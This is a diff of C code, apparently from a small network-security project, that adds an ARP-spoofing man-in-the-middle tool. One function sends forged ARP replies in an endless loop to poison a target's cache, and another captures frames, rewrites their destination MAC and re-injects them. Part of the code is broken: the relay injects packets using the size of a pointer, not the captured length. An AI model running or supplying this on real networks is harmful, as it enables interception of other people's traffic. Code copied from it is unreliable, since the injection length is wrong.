@@ -1,20 +1,40 @@
 #include <netinet/in.h> // for ntohs() function
 #include <pcap.h>       // for packet capturing
 #include <stdlib.h>
+#include <string.h>
 //for structure
 #include <netinet/ether.h>
+#include <netinet/ip.h>
 #include <arpa/inet.h>
 //custom headerfile
 #include "getLocalAddress.h"
 #include "ARPtools.h"
 
-int isPacketToRelay(u_char *packet, struct relaySession rSession)
+int isPacketToRelay(const u_char *packet, struct relaySession rSession)
 {
+    struct ether_header *etherHdr;
+    struct ip *ipHdr;
 
+    /* ethernet header */
+    etherHdr = (struct ether_header*)packet;
+    
+    // Check if it's IP packet
+    if(ntohs(etherHdr->ether_type)!=ETHERTYPE_IP)
+        return 0; //false
+
+    /* IP header */
+    ipHdr = (struct ip*)(packet + 14/*Ether_LEN*/);
+
+    // Check if it's a packet for (real) receiver 
+    if(memcmp(&ipHdr->ip_dst, &rSession.recvIP.s_addr, sizeof(in_addr_t))!=0)
+        return 0; //false
+
+    return 1; //true
 }
 
-void relayPackets(pcap_t *pcd, relaySession *relayList, int relayNum)
+void relayPackets(pcap_t *pcd, struct relaySession *relayList, int relayNum)
 {
+    int i;
     struct ether_header *etherHdr;
 
     struct pcap_pkthdr *recvHeader;
@@ -25,17 +45,46 @@ void relayPackets(pcap_t *pcd, relaySession *relayList, int relayNum)
     {
         // spin lock, escape after getting Response
         while(pcap_next_ex(pcd, &recvHeader, &recvPacket) != 1) ;
-
         
+        //TODO: check if the ARP restoration will occur
+
         // check if it's a packet to relay
         for(i=0;i<relayNum;i++)
         {
             if(isPacketToRelay(recvPacket, relayList[i]))
             {
+                printf("relay happens!\n");
+
                 // relay according to relayList[i]
+                etherHdr = (struct ether_header*)recvPacket;
+                memcpy(etherHdr->ether_dhost, &relayList[i].recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
+
+                // and hope there will be no runtime errors(no exception routine)
+                pcap_inject(pcd, recvPacket, sizeof(recvPacket));
             }
         }
+    }
 
+    return;
+}
+
+void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
+                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
+{
+    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+
+    makeARPpacket(packet, fakeIP, fakeMAC, targetIP, targetMAC, ARPOP_REPLY);
+
+    while(1)
+    {
+        // sending
+        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
+        {
+            pcap_perror(pcd,0);
+            pcap_close(pcd);
+            exit(1);
+        }
+        sleep(1);
     }
 
     return;
